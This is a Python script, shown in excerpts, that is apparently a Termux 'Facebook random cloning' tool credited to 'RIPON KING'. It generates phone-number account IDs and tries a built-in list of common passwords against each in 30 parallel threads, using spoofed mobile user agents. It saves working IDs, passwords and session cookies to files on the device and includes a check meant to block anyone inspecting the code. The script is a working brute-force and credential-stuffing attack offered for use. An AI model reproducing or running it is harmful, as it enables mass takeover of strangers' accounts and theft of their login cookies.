...
from os import system as Love_NXKING
...
for x in range(1000):
 ...
 E = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
 se = f'{A}{B}{C}{D}'
 if se in redmi:pass
...
if not 'print' in [path,'session.py']:
	pass
else:
	exit('Fuck Your Method Capture System')
...
for xd in range(10000):
    ...
    l='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'    
...
for i in range(10000):
    ...
    m='Mozilla/5.0 (Linux; Android 10;'
...
for agenku in range(10000):
  ...
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  m='Mozilla/5.0 (Linux; Android 10; K'
...
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
fst=f'{dot}[{H}shati{M}={H}abir{M}={H}tisha{M}={H}NX KING{M}={H}samim{P}]'
...
{M}┃{k} 𝗖𝗥𝗘𝗔𝗧𝗢𝗥  {H}• {m}𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆{M}                                                                                                  ┃
{M}┃{k} 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 {H}• {m}𝐌𝐃 𝐑𝐈𝐏𝐎𝐍{M}                                                                                                ┃
{M}┃{k} 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 {H}• {m}01943138008{M}                                                                                             ┃
{M}┃{k} 𝗧𝗢𝗢𝗟𝗦    {H}• {m}𝐏𝐀𝐈𝐃{M}                                                                                                                  ┃ 
{M}┃{k} 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  {H}• {m}5.6{M}                                                                                                                    ┃
{M}┃{k} 𝗚𝗜𝗧??𝗨𝗕   {H}• {m}𝐑𝐈𝐏𝐎𝐍-𝐊𝐈𝐍𝐆{M}                                                                                                ┃           
{M}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def mainx():
    os.system("clear")
    print(logo)
    print(f"{K} [{H}1{K}] {WHITE}Random Cloning")
    print(f"{K} [{M}0{K}] {WHITE}Back To Menu");print(led)
    KING = input(f'{wt}Select menu {M}:{H} ')
    if KING in ["1","01"]:
        x8()
    elif KING in ["0","00"]:
     mainx()
    else:
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=100062922853711&mibextid=ZbWKwL");mainx()

def x8():
  user=[]
  os.system('clear');print(logo);print(c8);print(led)
  ...
  clear();print(logo);print(f"{dot}{P}Number  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]')
  ...
  with tred(max_workers=30) as KING_xd:
    os.system('clear')
    tl = str(len(user))
    print(logo);print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+koda+kodb+guru
      pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:],'@#@#@#','bangladesh','free fire','i love you','Bangladesh','bangladesh','bangla','Bangla','i love you','free fire','@#@#@#','@@@###','jannat','sadiya','203040','405060','708090','102030','304050','nusrat','mimmim','fatema','farjana','soniya','tamanna','mababa','shathi','habiba','robiul','parvej','samiya','lamiya','sultana','304050','jumana','labiba','yeasin','alamin','rahman']
      KING_xd.submit(f1,idf,pwv)
...
useragent = ('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'.format(android_version1, android_model1, build1, browser_version1))


###----------[  FREE ]----------###
def f1(idf,pwv):
  global loop,ok,cp
  animasi = random.choice(["\x1b[1;91m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;92m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;93m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;94m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;95m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;96m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;97m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;91m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;92m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;93m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;94m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;95m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆","\x1b[1;96m𝐑𝐈𝐏𝐎𝐍 𝐊𝐈𝐍𝐆"])
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
        	print(f"\r\r\033[38;5;46m ┏━[𝘾𝙋 𝙄𝘿💔] ")
        	print(f"\r\r\033[38;5;46m ┣━[𝙉𝙐𝙈𝘽𝙀𝙍] : {idf} ")
        	print(f"\r\r\033[38;5;46m ┗━[𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿] : {ps} ")
        open(' /sdcard/NX KING.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
        ...
        print(f"\r\r\033[38;5;46m ┏━[𝙊𝙆 𝙄𝘿😇?] ")
        print(f"\r\r\033[38;5;46m ┣━[𝙐𝙄𝘿] : {cid} ")
        print(f"\r\r\033[38;5;46m ┣━[𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿] : {ps} ")
        if 'y' in cokix:
        	print(f"\r\r\033[38;5;46m ┗━[COOKIES] : {coki} ")
        open(' /sdcard/RIPON.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
      else:
        continue
...
if __name__=='__main__':
  try:os.mkdir('RIPON-KING')
  except:pass
  try:os.mkdir('Khorsed-RIPON KING')
  except:pass
#  b2()
#  mainx() 
  mainx()
